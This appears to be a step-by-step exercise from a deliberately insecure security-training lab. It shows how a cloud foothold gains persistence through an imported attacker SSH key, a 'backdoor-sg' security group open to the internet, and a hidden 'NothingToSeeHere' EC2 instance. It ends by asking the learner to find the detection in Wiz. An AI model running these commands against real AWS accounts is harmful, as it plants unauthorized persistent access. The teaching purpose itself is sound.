# 🔥 Vulnerable Labs: Persistence Pays Off!
*A deliberately insecure application for security education and demos*

---

## 💀 About the Challenge

In this exercise you'll learn how to leverage excessive permissions and misconfigurations to gain persistence in a cloud environment.

Mitre ATT&CK defines persistence as techniques to allow adversaries to maintain their access to systems and devices across restarts and other interruptions. 


### 🎯 Your Mission

1. On your laptop, open a terminal and run the following command to generate a new SSH keypair:
```bash
ssh-keygen -t rsa -f attacker_key
```
2. Update the permissions on the generated keys 
```bash
chmod 0600 attacker_key*
```
3. Run the following command to obtain the attacker_key public key. Note it down as you'll need this shortly.
```bash
cat attacker_key.pub
```
4. Ensure your reverse shell is still active. You can re-run the reverse shell commands from [2-Reverse-Shell.md](2-Reverse-Shell.md) if needed.
5. Run the following commands to install the AWS CLI (note we're using the tmp directory which is writeable):
```bash
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "/tmp/awscliv2.zip" && unzip /tmp/awscliv2.zip -d /tmp/aws && cd /tmp/aws && ./aws/install --install-dir /tmp/aws-cli --bin-dir /tmp/aws-cli-bin && /tmp/aws-cli-bin/aws sts get-caller-identity
```
6. Run the following command to create a file containing your attacker public key
```bash
echo "{attacker_key.pub}" > /tmp/attacker_key.pub
```
7. Run the following command to import your SSH Public Key
```bash
/tmp/aws-cli-bin/aws ec2 import-key-pair --key-name attacker_key --public-key-material fileb:///tmp/attacker_key.pub
```
8. Run the following command to create a security group
```bash
/tmp/aws-cli-bin/aws ec2 create-security-group \
--group-name backdoor-sg \
--description "SSH access for attacker" \
--vpc-id $(/tmp/aws-cli-bin/aws ec2 describe-vpcs --query "Vpcs[0].VpcId" --output text)
```
9. Run the following command to create a security group rule:
```bash
/tmp/aws-cli-bin/aws ec2 authorize-security-group-ingress \
--group-id $(/tmp/aws-cli-bin/aws ec2 describe-security-groups --filters "Name=group-name,Values=backdoor-sg" --query "SecurityGroups[0].GroupId" --output text) \
--protocol tcp \
--port 22 \
--cidr 0.0.0.0/0
```
10. Run the following command to launch a new shadow EC2 instance:
```bash
/tmp/aws-cli-bin/aws ec2 run-instances \
--instance-type t2.micro \
--image-id ami-0aa2b7722dc1b5612 \
--subnet-id $(/tmp/aws-cli-bin/aws ec2 describe-subnets --query "Subnets[?MapPublicIpOnLaunch].SubnetId | [0]" --output text) \
--tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=NothingToSeeHere}]' \
--security-group-ids $(/tmp/aws-cli-bin/aws ec2 describe-security-groups --group-names backdoor-sg --query "SecurityGroups[0].GroupId" --output text) \
--key-name attacker_key \
--associate-public-ip-address
```
11. From your laptop (where you created your attacker_key) SSH to the newly created EC2 instance:
```bash
ssh -i attacker_key ubuntu@ip_address
```


Congratulations, you've completed this challenge. Can you now find the corresponding detection in Wiz? How long did it take to appear in the console?

### 💥 Hints & Tips

